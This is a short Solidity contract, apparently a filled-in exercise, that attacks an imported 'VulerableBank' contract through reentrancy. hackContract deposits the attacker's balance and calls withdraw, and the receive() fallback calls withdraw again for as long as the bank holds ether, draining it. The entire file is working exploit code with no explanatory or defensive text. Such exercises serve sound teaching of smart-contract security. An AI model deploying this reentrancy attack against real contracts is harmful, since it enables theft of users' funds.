// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "./VulerableBank.sol";

contract HackBank {
    VulerableBank vulerableBank;

    constructor(address payable _bankAddress) payable {
        vulerableBank = VulerableBank(_bankAddress);
    }

    function hackContract() external {
        // fill me in!
        vulerableBank.deposit{value: address(this).balance}();
        vulerableBank.withdraw();
    }

    receive() external payable {
        if (address(vulerableBank).balance > 0) {
            vulerableBank.withdraw();
        }
    }
}
